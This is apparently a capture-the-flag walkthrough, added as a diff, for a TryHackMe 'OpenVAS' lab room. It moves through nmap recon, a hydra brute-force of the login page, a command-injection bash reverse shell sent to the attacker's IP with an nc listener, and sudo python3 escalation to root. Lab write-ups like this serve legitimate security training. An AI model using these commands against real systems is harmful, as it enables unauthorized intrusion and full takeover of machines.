@@ -1,0 +1,77 @@
+----------------                               ------------------
+               :::::::::::;| OPENVAS |;::::::::::::
+
+
+1) FIRST WE HAVE TO ACCES THE TRYHACKME FROM OPENVPN.
+2) WE HAVE TO JOIN THE ROOM "OPENVAS".
+ 
+TASK - 1 (RECON)
+
+1. SCAN THE MACHNE.
+
+    namp -Pn <ip>
+
+    nmap -A -T 5 <ip> -vv
+
+"it's a Linux machine".
+
+2. How many ports are open?
+ANS: 4 ports (22/SSH, 80/HTTP, 443/HTTPS, 9392/OPENVAS)
+
+3. What's on port 80?
+ANS: Apache default page - LAME!
+
+----------TASK 1 COMPLETED----------
+
+TASK - 2 (WEB EXPLOIT)
+
+1. CHECK HTTPS.
+
+    https://<ip>/
+    "OpenVAS login page - default creds maybe?"
+
+2. TRY DEFAULT CREDS.
+
+    admin:admin
+    "NOPE! Let's brute force!"
+
+    hydra -l admin -P /usr/share/wordlists/rockyou.txt <ip> https-post-form "/login/login:username=^USER^&password=^PASS^:Invalid"
+    "FOUND PASSWORD: password123"
+
+----------TASK 2 COMPLETED-----------
+ 
+TASK - 3 (GET SHELL)
+
+1. LOGIN TO OPENVAS.
+
+    https://<ip>/
+    admin:password123
+    "Find 'Command Execution' vulnerability in plugins"
+
+2. EXPLOIT COMMAND INJECTION.
+
+    nc -lvnp 4444
+    "Run: ;bash -c 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1'"
+    "BOOM! SHELL GET!"
+
+----------TASK 3 COMPLETED-----------
+
+TASK-4 (PRIV ESC)
+
+1. CHECK SUDO.
+
+    sudo -l
+    "Can run /usr/bin/python3 as root!"
+
+2. EXPLOIT PYTHON.
+
+    sudo /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
+    "ROOT SHELL GET!"
+
+FLAGS:
+    cat /root/root.txt
+    cat /home/openvas/user.txt
+
+-------------------                                                --------------------
+             -----------                                    ------------
+                  ---------- OPENVAS PWNED ----------
